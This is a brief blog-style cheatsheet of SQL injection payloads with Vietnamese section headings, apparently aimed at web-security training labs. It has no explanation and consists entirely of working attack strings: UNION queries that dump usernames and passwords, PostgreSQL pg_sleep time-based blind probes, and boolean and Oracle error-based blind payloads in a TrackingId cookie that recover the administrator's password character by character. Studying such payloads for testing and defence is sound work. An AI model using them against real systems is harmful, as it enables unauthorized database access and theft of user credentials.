---
title: "CHEATSHEET FOR SQLI"
date: 2026-05-14
category: "Tutorial"
series: "BONUS"
seriesOrder: 10
tags: []
draft: false
---

## CHECK SỐ CỘT

'+UNION+SELECT+NULL,NULL--

'+UNION+SELECT+'abcdef',NULL,NULL--

'+UNION+SELECT+username,+password+FROM+users--

'+UNION+SELECT+NULL,username||'\~'||password+FROM+users--

## CHECK TIME DELAY

' AND (SELECT pg\_sleep(10)) IS NULL--

' AND (SELECT 1 FROM pg\_sleep(10)) = 1--

' || pg\_sleep(10)--

```sql
' || (select case when (select '1' from user) = '1' then pg_sleep(10) else pg_sleep(0) end)--
```

```sql
' || (select case when (username='administrator' AND LENGTH(password)>3) then pg_sleep(5) else pg_sleep(0) end from users)--
```

```sql
' || (select case when (select length(password) from users where username = 'administrator') > 2 then pg_sleep(5) else pg_sleep(0) end)--
```

## CHECK ĐIỀU KIỆN

TrackingId=xyz' AND '1'='1

TrackingId=xyz' AND '1'='2

TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

```
' and cast((select username from users limit 1) as int)=1--
```

```
' and cast((select password from users limit 1) as int)=1--
```

```
TrackingId=xyz'||(SELECT '')||'
```

```
TrackingId=xyz'||(SELECT '' FROM dual)||'
```

```
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

```
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```